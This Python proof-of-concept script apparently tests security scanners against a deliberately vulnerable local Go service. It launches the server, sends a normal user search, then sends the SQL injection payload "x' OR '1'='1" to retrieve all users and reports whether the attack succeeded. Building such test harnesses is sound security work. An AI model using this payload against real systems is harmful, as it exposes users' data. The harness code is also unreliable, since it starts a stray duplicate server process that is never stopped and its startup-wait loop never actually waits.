#!/usr/bin/env python3
"""
PoC for subtle SQL injection in sql-injection-subtle (Go).
Starts the server, sends benign and malicious requests, and reports whether
the injection was observable. For use when testing security/SAST tools.
"""
import subprocess
import sys
import time
import urllib.request
import urllib.error
import urllib.parse

BASE = "http://localhost:8080"
SERVER_PID = None

def get(url):
    try:
        with urllib.request.urlopen(url, timeout=5) as r:
            return r.read().decode()
    except urllib.error.HTTPError as e:
        return e.read().decode() if e.fp else ""
    except Exception as e:
        return str(e)

def start_server():
    global SERVER_PID
    proc = subprocess.Popen(
        [sys.executable, "-c", "import subprocess; subprocess.run(['go', 'run', '.'], cwd='.')"],
        cwd=".",
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        shell=False,
    )
    # Actually run go run . in project dir
    import os
    proc = subprocess.Popen(
        ["go", "run", "."],
        cwd=os.path.dirname(os.path.abspath(__file__)),
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )
    SERVER_PID = proc.pid
    for _ in range(25):
        try:
            get(BASE + "/")
            break
        except Exception:
            time.sleep(0.4)
    else:
        print("Server did not start")
        proc.terminate()
        sys.exit(1)

def stop_server():
    global SERVER_PID
    if SERVER_PID:
        try:
            import os
            import signal
            os.kill(SERVER_PID, signal.SIGTERM)
        except Exception:
            pass

def main():
    import os
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    start_server()
    try:
        # Benign
        r = get(BASE + "/users/search?q=alice")
        ok_normal = "alice" in r and "users" in r

        # SQLi: return all users via OR 1=1
        payload = "x' OR '1'='1"
        r = get(BASE + "/users/search?q=" + urllib.parse.quote(payload))
        ok_injection = "admin" in r and "alice" in r and "bob" in r

        print("Normal query (q=alice):", "PASS" if ok_normal else "FAIL")
        print("SQLi (q=... OR 1=1) returns all users:", "PASS (vuln)" if ok_injection else "FAIL")
        if ok_injection:
            print("\n[+] Subtle SQL injection confirmed (taint crosses handler→service→repository→querybuilder).")
        else:
            print("\n[-] Injection not observable (server may be fixed or payload blocked).")
    finally:
        stop_server()

if __name__ == "__main__":
    main()
